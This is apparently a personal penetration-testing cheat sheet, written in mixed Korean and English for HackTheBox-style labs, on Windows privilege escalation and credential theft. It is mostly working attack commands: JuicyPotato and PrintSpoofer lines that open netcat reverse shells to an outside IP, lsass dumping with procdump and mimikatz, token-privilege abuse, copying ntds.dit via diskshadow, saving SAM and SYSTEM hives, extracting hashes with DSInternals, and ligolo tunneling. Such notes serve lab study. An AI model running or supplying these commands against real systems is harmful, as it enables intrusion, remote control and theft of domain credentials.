NXC lsassy module - lsass memory dump.

관리자 권한으로 powershell 실행.
Start-Process powershell -Verb RunAs


Seimpersonate Privilege
JuicyPotato - Doesn't work on windows server 2019, windows 10 build 1809.
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

SeDebugPrivilege - privilege for Debugable any process
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe 뒤 sekurlsa::minidump lsass.dmp 그리고 sekurlsa::logonpasswords

RCE via SeDebugPrivilege
https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1

usage
./psgetsys.ps1 [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")

pid는 tasklist로 조회 (tasklist는 administrator 권한 필요?)

https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC 이것도 가능


SeTakeOwnershipPrivilege - grant a user the aility to take ownership. this privilege uesr can assign 'write_owner' rights over an object.

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

- Checking file ownership
cmd /c dir /q 'C:\Department Shares\Private\IT
/q mean, display the owner information
takeown /f 'C:\Department Shares\Private\IT\cred.txt' - take ownership command.
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F - assign full access privilge over the file


https://github.com/ReversecLabs/SharpGPOAbuse

Abuse backup privilege
https://github.com/giuliano108/SeBackupPrivilege
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege - Enable SeBackupPrivilege (if it disabled)
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt : backup
```
```
Backup privilege and shadow disk
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
```
Or we can save system and sam registry to retrieve ntlm hash for the local users
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

```
extract credential from ntds.dit
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```


터널링
sudo ligolo-proxy -selfcert
session - 세션 확인
interface_create --name ligolo
route_add --name ligolo --route 10.10.162.0/24 - 라우트 추가
.\agent.exe -connect 192.168.45.204:11601 -ignore-cert - 연결.. 포트는 INFO[0000] Listening on 0.0.0.0:11601 에 있음.

snmpwalk -v2c -c public 192.168.135.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
